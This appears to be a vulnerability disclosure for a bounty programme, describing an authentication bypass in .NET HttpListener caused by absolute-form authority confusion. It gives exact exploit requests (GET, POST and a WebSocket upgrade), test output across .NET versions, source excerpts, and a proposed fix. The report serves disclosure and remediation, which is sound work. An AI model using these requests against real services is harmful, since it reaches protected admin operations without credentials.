# HttpListener absolute-form authority confusion -> framework-owned routing + authentication bypass

## Executive summary

On the managed HttpListener implementation used by Linux/macOS, one HTTP/1.1 absolute-form request can expose two
different authorities inside the framework:

- `HttpListenerRequest.Url.Host` = authority from the absolute request-target
- `HttpListenerRequest.UserHostName` = received `Host` field

That split occurs before HttpListener chooses the target listener and before it invokes
`AuthenticationSchemeSelectorDelegate`.

The framework itself therefore performs two inconsistent security-relevant decisions for one request:

1. `HttpEndPointListener.SearchListener(Request.Url)` chooses the destination HttpListener from `Url.Host`.
2. The selected listener's `AuthenticationSchemeSelectorDelegate` can then make its authentication decision using
   the Microsoft-documented `UserHostName` property.

A request can consequently be routed by HttpListener to an admin listener while the admin listener's own built-in
authentication selector sees the public authority and selects Anonymous.

No custom application router is required.

## Clean full matrix

Run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35528291290

Branch:

`research/dotnet-httplistener-framework-routing-20260920`

Matrix:

- .NET 8.0.31 / Ubuntu 24.04.5: vulnerable
- .NET 9.0.20 / Ubuntu 24.04.5: vulnerable
- .NET 10.0.12 / Ubuntu 24.04.5: vulnerable
- .NET 10.0.12 / macOS 15.7.9: vulnerable
- .NET 10.0.12 / Windows 2025 / http.sys: safe negative control

Synthetic authorities `public.test` and `admin.test` are mapped to loopback only in the researcher-controlled CI job.

## Framework configuration

Two distinct HttpListener instances share one researcher-controlled loopback endpoint:

```csharp
publicListener.Prefixes.Add($"http://public.test:{port}/");
adminListener.Prefixes.Add($"http://admin.test:{port}/");
```

The public listener is Anonymous.

The admin listener uses HttpListener's documented per-request selector:

```csharp
adminListener.AuthenticationSchemeSelectorDelegate = request =>
{
    string hostOnly = request.UserHostName.Split(':')[0];

    return hostOnly == "public.test"
        ? AuthenticationSchemes.Anonymous
        : AuthenticationSchemes.Basic;
};
```

The application does not inspect `Request.Url` to choose an admin resource. The managed HttpListener prefix router
selects the listener.

## Public control

```http
GET / HTTP/1.1
Host: public.test:<port>
Connection: close
```

Result on all tested platforms:

```text
HTTP/1.1 200 OK
basicChallenge=False
publicContext=True
adminContext=False
adminSentinel=False
```

## Admin control

```http
GET / HTTP/1.1
Host: admin.test:<port>
Connection: close
```

Managed Linux .NET 10 example:

```text
SELECTOR listener=ADMIN
UserHostName=admin.test:<port>
Url.Host=admin.test
Selected=Basic

HTTP/1.1 401 Unauthorized
basicChallenge=True
publicContext=False
adminContext=False
adminSentinel=False
```

The unauthenticated request is not delivered to the protected admin listener.

## Exploit request

```http
GET http://admin.test:<port>/ HTTP/1.1
Host: public.test:<port>
Connection: close
```

Managed Linux .NET 10:

```text
SELECTOR listener=ADMIN
UserHostName=public.test:<port>
Url.Host=admin.test
Selected=Anonymous

ADMIN_CONTEXT
UserHostName=public.test:<port>
Url.Host=admin.test
User=ANONYMOUS

HTTP/1.1 200 OK
basicChallenge=False
publicContext=False
adminContext=True
adminSentinel=True

FRAMEWORK_PREFIX_ROUTING_AUTH_BYPASS=CONFIRMED
```

The same result is confirmed on .NET 8.0.31 Linux, .NET 9.0.20 Linux, .NET 10.0.12 Linux, and .NET 10.0.12 macOS.

## Windows/http.sys negative control

The identical synthetic security model and attack request on .NET 10.0.12 Windows:

```text
SELECTOR listener=ADMIN
UserHostName=admin.test:<port>
Url.Host=admin.test
Selected=Basic

HTTP/1.1 401 Unauthorized
basicChallenge=True
publicContext=False
adminContext=False
adminSentinel=False

FRAMEWORK_PREFIX_WINDOWS_NEGATIVE_CONTROL=PASS
```

http.sys presents one canonical admin authority to both routing and authentication.

## Current source call chain

Validated source commit during research:

`12921b1d8c6865a774232de9379133020ad23d79`

Managed request initialization:

`src/libraries/System.Net.HttpListener/src/System/Net/Managed/HttpListenerRequest.Managed.cs`

The implementation begins from the Host-derived public property:

```csharp
ReadOnlySpan<char> host = UserHostName;
```

For an absolute-form target it later replaces only the local host used to construct `Request.Url`:

```csharp
if (raw_uri != null)
    host = raw_uri.Host;
```

The public property remains:

```csharp
public string UserHostName => Headers[HttpKnownHeaderNames.Host]!;
```

Framework prefix selection then uses the canonical URI:

`src/libraries/System.Net.HttpListener/src/System/Net/Managed/HttpEndPointListener.cs`

```csharp
HttpListener? listener = SearchListener(req.Url, out prefix);
...
string host = uri.Host;
...
if (p.Host != host || p.Port != port)
    continue;
...
bestMatch = localPrefixes[p];
```

After binding the context to that listener, the managed authentication path invokes its selector:

`src/libraries/System.Net.HttpListener/src/System/Net/Managed/ListenerAsyncResult.Managed.cs`

```csharp
context.AuthenticationSchemes =
    context._listener!.SelectAuthenticationScheme(context);
```

`src/libraries/System.Net.HttpListener/src/System/Net/Managed/HttpListener.Managed.cs`

```csharp
return AuthenticationSchemeSelectorDelegate != null
    ? AuthenticationSchemeSelectorDelegate(context.Request)
    : _authenticationScheme;
```

If Basic is selected and no valid Authorization header exists, the framework emits 401 and
`WWW-Authenticate: Basic ...` and does not complete the context to application code. If Anonymous is selected, the
context is completed and returned.

## Protocol invariant

RFC 9112 section 3.2.2 requires an origin server that accepts an absolute-form request-target to ignore the received
Host field and instead use the authority from the request-target.

https://www.rfc-editor.org/rfc/rfc9112.html#section-3.2.2

The same section states that servers must accept absolute-form, so simply rejecting all absolute-form requests is not
the protocol-preserving fix.

## Microsoft-documented authentication pattern

Microsoft documents `AuthenticationSchemeSelectorDelegate` as the mechanism for selecting different authentication
protocols based on characteristics of incoming requests.

Microsoft also documents `Url` and `UserHostName` as properties applications can use when selecting per-request
authentication mechanisms.

- https://learn.microsoft.com/dotnet/api/system.net.httplistener.authenticationschemeselectordelegate
- https://learn.microsoft.com/dotnet/api/system.net.httplistener.authenticationschemes

Microsoft's documentation states that an unauthenticated request which cannot satisfy the chosen authentication
mechanism is automatically answered with 401 and is not returned as an incoming context.

The vulnerable request violates exactly that property: the same admin listener which returns 401 for the ordinary
admin request returns an anonymous context for the conflicting absolute-form request.

## Security invariant

For a single accepted HTTP request, HttpListener must not use one authority to select the target listener/resource and
a different authority to select the authentication policy protecting that listener/resource.

## Scope

All hosts, listeners, ports, actions, credentials, and response sentinels used by this proof are synthetic and
researcher-controlled. No production services or third-party data are involved.


## .NET 11 RC1 — in-scope release-candidate validation

Microsoft's .NET bounty page explicitly includes release candidates for upcoming .NET versions.

Clean selector-model run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35529474195

.NET 11.0.0-rc.1.26425.128 results:

Linux:

```text
PUBLIC_CONTROL:
  200 OK / Anonymous / context delivered

ADMIN_CONTROL:
  401 Unauthorized
  Basic challenge=True
  context=False

ABSOLUTE_ADMIN_HOST_PUBLIC:
  UserHostName=public.test:<port>
  Url.Host=admin.test
  selected=Anonymous
  200 OK
  Basic challenge=False
  anonymous context=True
  admin sentinel=True

DOCS_MODEL_AUTHENTICATION_BYPASS=CONFIRMED
```

macOS produces the same vulnerable result.

Windows/http.sys RC1 negative control:

```text
ABSOLUTE_ADMIN_HOST_PUBLIC:
  UserHostName=admin.test:<port>
  Url.Host=admin.test
  selected=Basic
  401 Unauthorized
  Basic challenge=True
  context=False

DOCS_MODEL_WINDOWS_NEGATIVE_CONTROL=PASS
```

This confirms the bug is present not only in supported .NET 8/9/10 but also in the current supported/go-live .NET 11 RC1 line.


## Combined high-impact terminal: exact admin prefix + WebSocket + privileged operation

Clean run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35531404399

A separate researcher-controlled proof combines all demonstrated boundaries into a single chain.

Framework configuration:

```text
PUBLIC listener:
  http://public.test:<port>/

ADMIN listener:
  http://admin.test:<port>/admin/ws/

ADMIN AuthenticationSchemeSelectorDelegate:
  public.test -> Anonymous
  admin.test  -> Basic
```

Ordinary unauthenticated protected admin WebSocket request:

```http
GET /admin/ws/control HTTP/1.1
Host: admin.test:<port>
Upgrade: websocket
Connection: Upgrade
...
```

Result:

```text
Selected=Basic
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic ...
adminContext=False
wsUpgrade=False
commandExecuted=False
sideEffectCreated=False
```

Attack:

```http
GET http://admin.test:<port>/admin/ws/control HTTP/1.1
Host: public.test:<port>
Upgrade: websocket
Connection: Upgrade
...
```

Managed Linux/macOS result:

```text
HttpListener exact prefix routing:
  publicContext=False
  adminContext=True

selector:
  UserHostName=public.test:<port>
  Url.Host=admin.test
  Selected=Anonymous

wire:
  HTTP/1.1 101 Switching Protocols
  Basic challenge=False

client sends masked WebSocket command:
  EXECUTE_SYNTHETIC_ADMIN_CHANGE

ADMIN listener receives command
protected operation executes
researcher-controlled temp-file side effect is created

ULTIMATE_FRAMEWORK_ROUTING_AUTH_WEBSOCKET_COMMAND_BYPASS=CONFIRMED
```

Confirmed on:

- .NET 8.0.31 / Linux
- .NET 9.0.20 / Linux
- .NET 10.0.12 / Linux
- .NET 10.0.12 / macOS
- .NET 11.0.0-rc.1 / Linux
- .NET 11.0.0-rc.1 / macOS

Windows/http.sys negative controls on .NET 10 and .NET 11 RC1 both remain:

```text
Selected=Basic
401 Unauthorized
adminContext=False
wsUpgrade=False
commandExecuted=False
sideEffectCreated=False

ULTIMATE_WINDOWS_NEGATIVE_CONTROL=PASS
```

The operation is deliberately synthetic and writes only to the runner's temporary directory. This demonstrates
integrity impact after the authentication boundary is crossed; it is not a claim of arbitrary code execution.

The same root cause therefore supports all of the following researcher-controlled terminals:

1. protected admin context returned anonymously;
2. protected state-changing HTTP POST executed;
3. protected admin WebSocket upgraded to 101 without Basic authentication;
4. bidirectional privileged command accepted over that WebSocket;
5. concrete filesystem side effect from the synthetic protected operation.


## Credential-validation bypass terminal

Clean run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35531683745

This proof specifically addresses the fact that managed HttpListener Basic authentication surfaces the supplied Basic
identity/password to application code.

A separate researcher-controlled credential-validation layer is added after HttpListener returns a Basic context:

```text
expected username: research-admin
expected password: correct-research-password
```

The protected admin operation is executed only after that validation succeeds for a Basic identity. Anonymous public
requests intentionally do not enter the Basic credential-validation path because the framework selector classifies
them as public.

Controls:

```text
PUBLIC_CONTROL
  Selected=Anonymous
  200 OK
  credentialValidationRan=False
  adminOperation=False

ADMIN_NO_CREDENTIALS
  Selected=Basic
  401 Unauthorized
  Basic challenge=True
  context=False
  adminOperation=False

ADMIN_WRONG_CREDENTIALS
  Selected=Basic
  context=True
  credentialValidationRan=True
  credentialValidationPassed=False
  403 Forbidden
  adminOperation=False
  sideEffect=False

ADMIN_CORRECT_CREDENTIALS
  Selected=Basic
  credentialValidationRan=True
  credentialValidationPassed=True
  200 OK
  adminOperation=True
  sideEffect=True
```

Attack, with **no Authorization header**:

```http
POST http://admin.test:<port>/admin/change HTTP/1.1
Host: public.test:<port>
Content-Length: 0
Connection: close
```

Managed result:

```text
Selected=Anonymous
selectorUserHost=public.test:<port>
selectorUrlHost=admin.test
HTTP/1.1 200 OK
context=True
userNull=True
credentialValidationRan=False
credentialValidationPassed=False
adminOperation=True
sideEffect=True

HOST_AUTHORITY_CONFUSION_BYPASSES_CREDENTIAL_VALIDATION=CONFIRMED
```

Thus the no-credential attack executes an operation that deliberately supplied **wrong Basic credentials cannot
execute**.

This is confirmed on:

- .NET 8.0.31 / Linux
- .NET 9.0.20 / Linux
- .NET 10.0.12 / Linux
- .NET 10.0.12 / macOS
- .NET 11.0.0-rc.1 / Linux
- .NET 11.0.0-rc.1 / macOS

Windows/http.sys on both .NET 10 and .NET 11 RC1 canonicalizes the conflict first:

```text
Selected=Basic
401 Unauthorized
context=False
adminOperation=False
sideEffect=False

CREDENTIAL_VALIDATION_WINDOWS_NEGATIVE_CONTROL=PASS
```

This terminal demonstrates that the authority confusion can bypass not only the framework's Basic challenge but also
an application credential-validation stage that wrong credentials fail and correct credentials pass.

The proof remains deliberately synthetic: the protected operation creates only a marker in the runner's temporary
directory.


## Causal current-main fix proof — hostname authority

Clean current-main run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35530783238

Validated source commit:

`12921b1d8c6865a774232de9379133020ad23d79`

Unpatched source:

```text
CURRENT_MAIN_AUTHORITY_CONFUSION=CONFIRMED
CURRENT_MAIN_PUBLIC_CONTROL=PASS
CURRENT_MAIN_ADMIN_BASIC_CONTROL=PASS
CURRENT_MAIN_AUTH_SCHEME_FULL_WIRE_BYPASS=CONFIRMED
```

A minimal managed-source experiment canonicalizes the Host-facing value to the absolute-form authority and rebuilds the
actual `System.Net.HttpListener` product assembly before rerunning the same security regression.

Patched-source result:

```text
EXPERIMENTAL_GUARD_PUBLIC_CONTROL=PASS
EXPERIMENTAL_GUARD_ADMIN_CONTROL=PASS
EXPERIMENTAL_GUARD_SELECTOR UserHostName=admin.test:<port> Url.Host=admin.test Selected=Basic
EXPERIMENTAL_AUTHORITY_CANONICALIZATION_GUARD=BLOCKS_BYPASS
```

So the hostname-authority bypass is causally removed while both public and admin controls remain unchanged.

## Cross-port authority variant — affects Windows/http.sys too

A second, stronger sibling variant uses the **same hostname on two ports**:

```text
PUBLIC listener: http://app.test:<publicPort>/public/
ADMIN listener:  http://app.test:<adminPort>/admin/
```

The attacker connects directly to the ADMIN port but sends an absolute-form target naming the PUBLIC port:

```http
POST http://app.test:<publicPort>/admin/change HTTP/1.1
Host: app.test:<publicPort>
Content-Length: 0
Connection: close
```

HttpListener exposes:

```text
UserHostName / Host-facing authority = app.test:<publicPort>
Request.Url.Authority               = app.test:<adminPort>
```

The admin listener's selector therefore selects Anonymous from the public port while framework routing remains bound to
the admin socket/listener. The protected admin operation executes and creates the synthetic side effect.

Clean cross-platform run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35532123773

Confirmed:

- .NET 8.0.31 Linux
- .NET 8.0.31 Windows/http.sys
- .NET 9.0.20 Linux
- .NET 9.0.20 Windows/http.sys
- .NET 10.0.12 Linux
- .NET 10.0.12 macOS
- .NET 10.0.12 Windows/http.sys
- .NET 11.0.0-rc.1 Linux
- .NET 11.0.0-rc.1 macOS
- .NET 11.0.0-rc.1 Windows/http.sys

Representative Windows .NET 10 result:

```text
ADMIN_CONTROL:
  UserHostName=app.test:<adminPort>
  UrlAuthority=app.test:<adminPort>
  Selected=Basic
  401 Unauthorized
  sideEffect=False

ABSOLUTE_PUBLIC_PORT_TO_ADMIN_SOCKET:
  connectPort=<adminPort>
  UserHostName=app.test:<publicPort>
  UrlAuthority=app.test:<adminPort>
  Selected=Anonymous
  200 OK
  adminContext=True
  sideEffect=True

CROSS_PORT_FRAMEWORK_AUTH_BYPASS=CONFIRMED
```

This broadens the root cause from a managed-only hostname discrepancy to a more general **absolute-form authority
inconsistency**: host and port components can be sourced from different places, and the port variant reproduces on
Windows/http.sys as well.

Important remediation implication: the three-line managed Host canonicalization experiment closes the hostname variant,
but a complete product fix must canonicalize the **entire authority (host + port)** consistently for request properties,
listener/resource routing, and authentication selection, or reject inconsistent absolute-form authority when it cannot
be represented consistently.
